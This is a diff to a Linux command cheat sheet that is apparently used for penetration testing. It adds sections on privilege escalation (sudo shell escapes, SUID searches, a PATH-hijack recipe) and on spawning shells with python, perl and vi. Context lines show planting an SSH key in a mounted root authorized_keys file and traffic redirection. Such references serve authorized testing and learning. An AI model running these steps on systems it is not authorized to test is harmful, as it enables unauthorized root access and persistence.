@@ -47,8 +47,8 @@ chmod 755 test.sh                  Make a file executable
 
 # File System
 
-/etc/passwd                        Where users accounts are stored
-/etc/shadow                        Contains encrypted passwords
+/etc/passwd                        User accounts
+/etc/shadow                        Encrypted passwords
 ------------------------------------------------------------------------------------------------------
  
 # Files
@@ -59,7 +59,7 @@ ls -la                             Long form listing with hidden files
 
 cd ~                               Change to the home directory
 cd test                            Change to the test directory
-pwd                                Show the current directory
+pwd                                Current directory
 
 cp tmp tmp2                        Copy a file from one location to another
 cp -r dir dir2                     Copy a directory from one location to another
@@ -72,30 +72,37 @@ ln -s /path/to/file /path/to/link  Create a symbolic link
 mkdir tmp                          Create a directory called tmp
 touch tmp                          Create a file called tmp
 
-cat tmp                            Show the contents of tmp
+cat tmp                            Contents of tmp
 ifconfig > tmp                     Pipe the output of a command to a file
 cat tmp >> tmp2                    Append the contents of a file (tmp) to another file (tmp2)
 
-head tmp                           Show the first 10 lines of tmp
-head -20 tmp                       Show the first 20 lines of tmp
-more tmp                           Show the contents of tmp, one page at a time 
-                                   Space bar for next page and q to exit
+head tmp                           First 10 lines of tmp
+head -20 tmp                       First 20 lines of tmp
+more tmp                           Contents of tmp, one page at a time 
+                                   Space bar for the next page or q to quit
 
-tail tmp                           Show the last 10 lines of tmp
-tail -20 tmp                       Show the last 20 lines of tmp
-tail -f tmp                        Show the file contents as it grows
+tail tmp                           Last 10 lines of tmp
+tail -20 tmp                       Last 20 lines of tmp
+tail -f tmp                        File contents as it grows
+------------------------------------------------------------------------------------------------------
+
+# File Integrity
+
+md5sum test.iso                    MD5 hash
+sha1sum test.iso                   SHA1 hash
+sha256sum test.iso                 SHA256 hash
 ------------------------------------------------------------------------------------------------------
 
 # Finding Files
 
 updatedb                           Update the database of file names on the system
 locate file                        Reads the database and shows the location of a file
-which app                          Show the path where the app is executed from
+which app                          Path where the app is executed from
 
 find / -name pass*                 Find all the files that start with pass
 
-find / -perm -o+w -type d          Find all world readable directories
-find / -perm -o+e -type d          Find all world executable directories
+find / -user <user> 2>/dev/null    All files owned by a particular user
+find / -group <group> 2>/dev/null  All files owned by a particular group
 ------------------------------------------------------------------------------------------------------
 
 # Installation
@@ -107,20 +114,15 @@ make install
 dpkg -i app.deb                    Install Debian package
 rpm -Uvh app.rpm                   Install RPM package
 
-dpkg-query -l                      Show a list of installed packages
+dpkg-query -l                      Installed packages
 
 pip install -r requirements.txt    Install required packages listed in a file
-------------------------------------------------------------------------------------------------------
-
-# Integrity
-
-md5sum test.iso                    MD5 hash
-sha1sum test.iso                   SHA1 hash
 ------------------------------------------------------------------------------------------------------
 
 # Networking
 
 dhclient                           Request an IP address from the DHCP server
+netstat -antpu                     Listening ports, services, and PIDs
 route                              Gateway
 /etc/hostname                      Hostname
 /etc/network/interfaces            Network interfaces
@@ -149,10 +151,60 @@ gateway 192.168.2.1
 /etc/init.d/networking restart     Restart networking
 ------------------------------------------------------------------------------------------------------
 
+# Privilege Escalation
+
+- Execute a root command as another user
+/etc/sudoers                       Commands that a user is allowed to execute
+sudo -l                            Short version
+sudo <user>
+!/bin/sh
+id
+
+- Check for binaries with Sticky bit, SUID, and GUID.
+find / -perm -1000 -type d 2>/dev/null    # Sticky bit - only the owner of a directory or a file can delete or rename.
+find / -perm -u=s -type f 2>/dev/null     # SUID (chmod 4000) - run as the owner, not the user who started it.
+find / -perm -g=s -type f 2>/dev/null     # GUID (chmod 2000) - run as the group, not the user who started it.
+
+- Abuse the PATH variable
+echo '/bin/sh' > whoami
+chmod 777 whoami
+export PATH=/tmp:$PATH
+/usr/bin/bin_with_suid
+id
+
+- Check for world-writable files and folders.
+find / -perm -o+w -type f 2>/dev/null     # world-writeable files
+find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print     # world-writeable files
+
+find / -writable -type d 2>/dev/null      # world-writeable folders
+find / -perm -222 -type d 2>/dev/null     # world-writeable folders
+find / -perm -o+w -type d 2>/dev/null     # world-writeable folders
+
+- Check for world-execuable files and folders.
+find / -perm -o+x -type f 2>/dev/null     # world-executable files
+find / -perm -o+x -type d 2>/dev/null     # world-executable folders
+
+- Check for world-writeable & world-executable folders
+find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null
+
+- Check for files owned by no owner.
+find /dir -xdev \( -nouser -o -nogroup \) -print
+
+- Cron jobs
+crontab -l                         Check for entries
+ls -l /etc/cron*                   Scheduled cron jobs
+
+What files are owned by a particular user, but are not present in their home directory?
+What are the files present in the /home/user folder? Are there any hidden files and folders?
+What groups does the user belong to?
+------------------------------------------------------------------------------------------------------
+
 # Processes
 
-ps fauwwwx                         Show active processes
-top                                Show running processes, CPU, and memory
+ps faux                            All running processes
+ps -ef | grep root                 Processes running as root
+ps -ef | grep -v root              Processes running under another account besides root
+top                                Running processes, CPU, and memory
 kill -9 <PID>                      Kill process ID
 killall <service>                  Kill all processes named service
 ------------------------------------------------------------------------------------------------------
@@ -171,6 +223,7 @@ socat TCP4-LISTEN:443,fork TCP4:<remoteIP>:443
 
 If you experience any slow traffic issues, switch to iptables.
 
+iptables -L
 iptables -I INPUT -p tcp -m tcp --dport 443 -j ACCEPT
 iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination <remoteIP>:80
 iptables -t nat -A POSTROUTING -j MASQUERADE
@@ -224,6 +277,16 @@ Xnest :1				          attacker - catch the incoming xterm, start an X-Server.
 xhost +targetIP				attacker - Authorise the target to connect to you.
 ------------------------------------------------------------------------------------------------------
 
+# Screen
+
+screen -S test                     Start a new screen session named test
+ctrl + a d                         Detach from the session
+screen -ls                         Sessions
+screen -dr                         Attach to the current session
+screen -r <PID or name>            Attach to a specific session
+exit                               Exit the session
+------------------------------------------------------------------------------------------------------
+
 # Searching
 
 grep                               Search for a pattern a file
@@ -231,23 +294,55 @@ grep -r                            Search recursively for a pattern in a directo
 zgrep                              Search for a pattern in a zip file
 ------------------------------------------------------------------------------------------------------
 
-# Screen
+# Spawning a TTY Shell
 
-screen -S test                     Start a new screen session named test
-ctrl + a d                         Detach from the session
-screen -ls                         List the sessions
-screen -dr                         Attach to the current session
-screen -r <PID or name>            Attach to a specific session
-exit                               Exit the session
+- IRB
+exec "/bin/sh"
+
+- Lua
+lua: os.execute('/bin/sh')
+
+- Perl
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+
+- Python
+python -c 'import pty; pty.spawn("/bin/sh")'
+or
+python -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import os; os.system("/bin/bash")'
+
+- Ruby
+ruby: exec "/bin/sh"
+
+- sh
+/bin/sh -i
+
+- vi
+:!bash
+:set shell=/bin/bash:shell
+
+If you execute
+vi ;/bin/bash
+Once we exit vi, we would get shell.
 ------------------------------------------------------------------------------------------------------
 
 # SSH
 
 ssh-keygen                         Generate new public/private key pair
 
-ssh user@targetIP                  Connect on a standard port
-ssh user@targetIP -p 2222          Connect on a non-standard port
-ssh user@targetIP -i file.pem      Connect and authenticate using an identity file
+- Permissions
+-rw-------  authorized_keys
+-rw-r--r--  config
+-rw-------  id_rsa
+-rw-r--r--  id_rsa.pub
+-rw-------  identity_file
+-rw-r--r--  known_hosts
+
+ssh root@targetIP                  Connect as root on a standard port
+ssh targetIP                       Connect with no user name on a standard port
+ssh root@targetIP -p 2222          Connect as root on a non-standard port
+ssh root@targetIP -i key           Connect as root and authenticate using an identity file
 
 - Local port forward
 ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
@@ -298,15 +393,12 @@ fdisk -l                           Partition table
 finger <user>                      Info about a user
 free                               Memory and swap usage
 halt                               Power off
-last                               List last 10 users logged on
 /proc/cpuinfo                      CPU info
 /proc/meminfo                      Memory info
 reboot                             Reboot
 set                                Environmental variables
 uname -a                           Kernel info
 uptime                             Current uptime
-w                                  Logged on users
-whoami                             Who you are logged in as
 ------------------------------------------------------------------------------------------------------
 
 # Terminal
@@ -359,9 +451,13 @@ Remote Kali                        vncserver -kill :1
 
 # User Accounts
 
+whoami                             Who are you logged in as
+id                                 User and group ids
+w                                  Users currently logged on
+last                               Last 10 users logged on
+
 /etc/passwd                        User accounts
 /etc/shadow                        Encrypted passwords
-id                                 User and group permissions
 
 passwd                             Change root password
 passwd <user>                      Change another user's password
@@ -373,6 +469,7 @@ userdel                            Delete user
 userdel -r                         Delete user and user's home directory
 usermod                            Modify user
 
+/etc/group                         Groups
 groupadd                           Add new group
 groupdel                           Delete group
 groupmod                           Modify group
@@ -382,7 +479,7 @@ adduser <user> <group>             Add user to group
 
 # Video resolution
  
-xrandr                             Show supported resolutions
+xrandr                             Supported resolutions
 xrandr -s <resolution>             Set resolution
 ------------------------------------------------------------------------------------------------------
 
@@ -445,15 +542,6 @@ Enter the replacement character.
 ------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------
 
-# NFS Shares Anonymous Mountable
-
-showmount -e <target IP>
-
-apt-get install nfs-common
-mkdir /mnt/nfs/
-mount -t nfs -o nolock <target IP>:/share /mnt/nfs/
-------------------------------------------------------------------------------------------------------
-
 # CIFS Shares Anonymous Mountable
 
 mkdir /mnt/cifs/
@@ -462,6 +550,15 @@ mount -t cifs -o username=user,domain=foo //<target IP>/share /mnt/cifs
 OS X: mount -t cifs //<target IP>:Users/<user> /mnt/cifs/ -o user=<user>,pass=<password>,nounix,sec=ntlmssp
 
 cat /root/.ssh/id_rsa.pub >> /tmp/mount/root/.ssh/authorized_keys
+------------------------------------------------------------------------------------------------------
+
+# NFS Shares Anonymous Mountable
+
+showmount -e <target IP>
+
+apt-get install nfs-common
+mkdir /mnt/nfs/
+mount -t nfs -o nolock <target IP>:/share /mnt/nfs/
 ------------------------------------------------------------------------------------------------------
 
 # Rstatd enabled
